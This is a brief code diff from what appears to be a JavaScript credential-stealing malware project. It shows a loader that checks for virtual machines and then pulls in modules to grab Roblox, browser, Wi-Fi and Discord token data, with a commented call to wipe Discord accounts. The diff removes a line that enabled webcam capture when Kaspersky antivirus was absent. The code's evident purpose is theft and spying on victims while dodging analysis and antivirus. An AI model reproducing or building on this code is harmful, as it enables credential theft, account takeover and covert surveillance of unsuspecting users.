@@ -29,7 +29,6 @@ if (config.vmProtect && checkVM()) {
   require('./functions/grab-roblox');
   require('./functions/grab-browsers-data');
   config.wifiNetworks && require('./functions/wifi-networks');
-  if (config.camera && !hasKaspersky()) require('./functions/camera');
 
   require('./functions/grab-discord-token').then(() => {
     // require('./functions/nuke-discord-account');
